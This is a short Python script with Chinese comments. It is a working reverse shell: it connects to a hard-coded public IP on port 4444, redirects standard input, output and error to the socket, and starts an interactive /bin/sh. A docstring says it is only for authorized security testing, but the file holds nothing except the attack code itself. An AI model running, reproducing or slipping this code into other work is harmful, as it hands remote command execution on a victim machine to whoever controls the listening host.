#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell(host, port):
    """
    反弹shell - 仅用于授权的安全测试
    """
    try:
        # 建立TCP连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # 重定向标准I/O到socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        
        # 启动shell
        subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        print(f"连接失败: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    # 目标主机和端口（监听端）
    TARGET_HOST = "94.74.110.167"  # 替换为实际IP
    TARGET_PORT = 4444         # 替换为实际端口
    
    reverse_shell(TARGET_HOST, TARGET_PORT)